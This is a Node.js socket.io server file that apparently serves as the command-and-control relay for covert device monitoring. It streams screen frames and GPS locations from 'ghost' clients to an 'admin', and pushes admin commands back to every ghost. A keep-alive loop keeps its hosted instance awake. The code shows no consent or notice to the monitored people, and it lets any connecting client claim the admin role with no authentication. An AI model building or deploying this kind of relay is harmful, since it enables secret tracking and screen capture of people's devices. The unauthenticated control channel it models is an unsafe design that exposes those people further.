const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const axios = require('axios');

const app = express();
const server = http.createServer(app);

// 1. OPTIMIZED SOCKET CONFIG
const io = new Server(server, {
  maxHttpBufferSize: 1e8, // 100MB Buffer for large image data
  pingTimeout: 60000,
  pingInterval: 25000,
  cors: {
    origin: "*", // Allows any Ghost/Admin app to connect
    methods: ["GET", "POST"]
  }
});

// 2. RENDER KEEP-ALIVE (Self-Ping every 14 minutes)
const SERVER_URL = "https://joyjet-server.onrender.com";
setInterval(async () => {
  try {
    await axios.get(SERVER_URL);
    console.log('Self-ping successful: Server is awake.');
  } catch (e) {
    console.error('Self-ping failed, but server is likely still up.');
  }
}, 840000); // 14 Minutes

// 3. LOGIC HANDLERS
let adminSocketId = null;

io.on('connection', (socket) => {
  console.log('New connection:', socket.id);

  // Identify Admin vs Ghost
  socket.on('claim_admin', (data) => {
    adminSocketId = socket.id;
    socket.emit('role_assigned', { role: 'ADMIN', name: data.name });
    console.log('Admin identified:', data.name);
  });

  socket.on('register_user', (data) => {
    socket.emit('role_assigned', { role: 'GHOST', name: data.name });
    console.log('Ghost registered:', data.name);
  });

  // Relay Screen Stream (Ghost -> Admin)
  socket.on('screen_frame', (frame) => {
    if (adminSocketId) {
      io.to(adminSocketId).emit('live_feed', frame);
    }
  });

  // Relay GPS (Ghost -> Admin)
  socket.on('ghost_location_data', (coords) => {
    if (adminSocketId) {
      io.to(adminSocketId).emit('ghost_update', { type: 'GPS', data: coords });
    }
  });

  // Relay Commands (Admin -> Ghost)
  socket.on('admin_command', (cmd) => {
    socket.broadcast.emit('admin_command', cmd);
  });

  socket.on('disconnect', () => {
    if (socket.id === adminSocketId) adminSocketId = null;
    console.log('Disconnected:', socket.id);
  });
});

// Basic health check endpoint
app.get('/', (req, res) => res.send('System Framework Active'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
